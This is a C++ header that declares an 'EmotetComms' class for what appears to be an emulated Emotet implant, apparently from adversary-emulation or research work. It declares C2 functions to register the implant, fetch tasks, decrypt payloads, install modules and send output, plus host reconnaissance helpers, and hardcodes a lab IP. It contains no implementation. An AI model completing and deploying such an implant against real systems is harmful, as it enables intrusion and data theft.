#pragma once
#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include "atlstr.h"
#include "winhttp.h"
#include <tlhelp32.h>
#include <vector>

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "winhttp.lib")

#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

#define IP_ADDRESS "192.168.0.4"

#ifdef  EMOTET_COMMS_EXPORTS
#define Emotet_API _declspec(dllexport)
#else
#define Emotet_API _declspec(dllimport)
#endif //  EMOTET_COMMS_EXPORTS

#define BUFSIZE 1024
#define SHA256LEN 64
#define SHA256_ASCII_LEN (SHA256LEN * 2 + 1)
#define MAX_BUF_SIZE (2 << 17)

using namespace std;

class Emotet_API EmotetComms
{
private:
	string machineID;
public:

	EmotetComms();
	~EmotetComms();

	string generateMachineID();
	int getMachineIDLength(string);
	string sendRequest(LPCWSTR, string, string, string, string);
	bool installModule(string, string);
	bool registerImplant();
	string getTask();
	string decodeDecrypt(string, string);
	bool sendOutput(string);

	// helper functions
	string getPayloadSizeStr(string);
	string trimPadding(string, string);
	string getModulePath(string);
	string getUser();
	string getComputerName();
	string getCWD();
	string getPID();
	string getPPID();
};
